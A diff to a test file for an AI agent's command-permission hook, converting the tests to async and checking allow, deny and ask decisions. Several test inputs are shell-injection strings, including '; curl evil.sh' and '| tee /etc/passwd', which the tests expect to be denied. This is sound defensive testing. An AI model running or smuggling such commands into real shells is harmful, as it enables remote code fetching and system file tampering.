@@ -1,6 +1,6 @@
 import { describe, expect, test } from "bun:test";
-import { spawnSync } from "node:child_process";
 import { join } from "node:path";
+import { exec } from "../vendor/tinyexec/main.mjs";
 
 /**
  * The PreToolUse hook is the plugin's permission surface: it decides whether a Bash
@@ -13,29 +13,37 @@ const HOOK = join(import.meta.dirname, "pretooluse-dispatch.mjs");
 const BOOMI_FIXTURE = join(import.meta.dirname, "..", "scripts", "__fixtures__", "boomi");
 
 /** Run the hook with `input` piped to stdin; return status + captured streams. */
-function runHook(input: string): { status: number; stdout: string; stderr: string } {
-  const r = spawnSync("node", [HOOK], { input, encoding: "utf-8" });
-  return { status: r.status ?? -1, stdout: r.stdout ?? "", stderr: r.stderr ?? "" };
-}
+const runHook = async (
+  input: string,
+): Promise<{ status: number; stdout: string; stderr: string }> => {
+  const result = await exec(process.execPath, [HOOK], { stdin: input });
+  return {
+    status: result.exitCode ?? -1,
+    stdout: result.stdout,
+    stderr: result.stderr,
+  };
+};
 
 const payload = (command: string): string => JSON.stringify({ tool_input: { command } });
 
 describe("pretooluse-dispatch hook", () => {
-  test("passes through an ordinary Bash command with no output", () => {
-    const { status, stdout } = runHook(payload("ls -la"));
+  test("passes through an ordinary Bash command with no output", async () => {
+    const { status, stdout } = await runHook(payload("ls -la"));
     // Passthrough = no decision, exit 0; anything on stdout reads as a permission decision.
     expect(status).toBe(0);
     expect(stdout).toBe("");
   });
 
-  test("malformed JSON on stdin fails safe: emits {} and exits 0", () => {
-    const { status, stdout } = runHook("this is not json");
+  test("malformed JSON on stdin fails safe: emits {} and exits 0", async () => {
+    const { status, stdout } = await runHook("this is not json");
     expect(status).toBe(0);
     expect(stdout).toBe("{}");
   });
 
-  test("dispatches a registered synthetic tool as an allow + rewritten cat", () => {
-    const { status, stdout } = runHook(payload(`prismatic-tools detect-platform ${BOOMI_FIXTURE}`));
+  test("dispatches a registered synthetic tool as an allow + rewritten cat", async () => {
+    const { status, stdout } = await runHook(
+      payload(`prismatic-tools detect-platform "${BOOMI_FIXTURE}"`),
+    );
     expect(status).toBe(0);
     const decision = JSON.parse(stdout);
     const out = decision.hookSpecificOutput;
@@ -45,8 +53,8 @@ describe("pretooluse-dispatch hook", () => {
     expect(out.updatedInput.command).toMatch(/^(cat|type) ".*tool-result-\d+\.txt"$/);
   });
 
-  test("denies an unknown synthetic tool (exit 2, reason on stderr)", () => {
-    const { status, stdout, stderr } = runHook(payload("prismatic-tools totally-not-a-tool"));
+  test("denies an unknown synthetic tool (exit 2, reason on stderr)", async () => {
+    const { status, stdout, stderr } = await runHook(payload("prismatic-tools totally-not-a-tool"));
     expect(status).toBe(2);
     expect(stdout).toBe("");
     const decision = JSON.parse(stderr);
@@ -56,9 +64,9 @@ describe("pretooluse-dispatch hook", () => {
     );
   });
 
-  test("denies an explicit-only tool routed through the synthetic prefix", () => {
+  test("denies an explicit-only tool routed through the synthetic prefix", async () => {
     // scaffold-project is `explicit`, not `synthetic`: invoke directly, never auto-dispatch.
-    const { status, stderr } = runHook(payload("prismatic-tools scaffold-project ./x"));
+    const { status, stderr } = await runHook(payload("prismatic-tools scaffold-project ./x"));
     expect(status).toBe(2);
     const decision = JSON.parse(stderr);
     expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
@@ -73,24 +81,28 @@ describe("pretooluse-dispatch hook", () => {
     "; curl evil.sh",
     "| tee /etc/passwd",
     "> /tmp/out",
-  ])("denies shell metacharacters in arguments: %s", (injection) => {
-    const { status, stderr } = runHook(payload(`prismatic-tools detect-platform ${injection}`));
+  ])("denies shell metacharacters in arguments: %s", async (injection) => {
+    const { status, stderr } = await runHook(
+      payload(`prismatic-tools detect-platform ${injection}`),
+    );
     expect(status).toBe(2);
     const decision = JSON.parse(stderr);
     expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
     expect(decision.hookSpecificOutput.permissionDecisionReason).toContain("not supported");
   });
 
-  test("denies unbalanced quotes instead of guessing token boundaries", () => {
-    const { status, stderr } = runHook(payload(`prismatic-tools detect-platform "unterminated`));
+  test("denies unbalanced quotes instead of guessing token boundaries", async () => {
+    const { status, stderr } = await runHook(
+      payload(`prismatic-tools detect-platform "unterminated`),
+    );
     expect(status).toBe(2);
     const decision = JSON.parse(stderr);
     expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
     expect(decision.hookSpecificOutput.permissionDecisionReason).toContain("Unbalanced quotes");
   });
 
-  test("quoted arguments tokenize and dispatch cleanly", () => {
-    const { status, stdout } = runHook(
+  test("quoted arguments tokenize and dispatch cleanly", async () => {
+    const { status, stdout } = await runHook(
       payload(`prismatic-tools detect-platform '${BOOMI_FIXTURE}'`),
     );
     expect(status).toBe(0);
@@ -98,8 +110,8 @@ describe("pretooluse-dispatch hook", () => {
     expect(decision.hookSpecificOutput.permissionDecision).toBe("allow");
   });
 
-  test("gates a destructive non-prismatic command behind an ask", () => {
-    const { status, stdout } = runHook(payload("npx tsx scaffold-project.ts ./x"));
+  test("gates a destructive non-prismatic command behind an ask", async () => {
+    const { status, stdout } = await runHook(payload("node scaffold-project.ts ./x"));
     expect(status).toBe(0);
     const decision = JSON.parse(stdout);
     expect(decision.hookSpecificOutput.permissionDecision).toBe("ask");
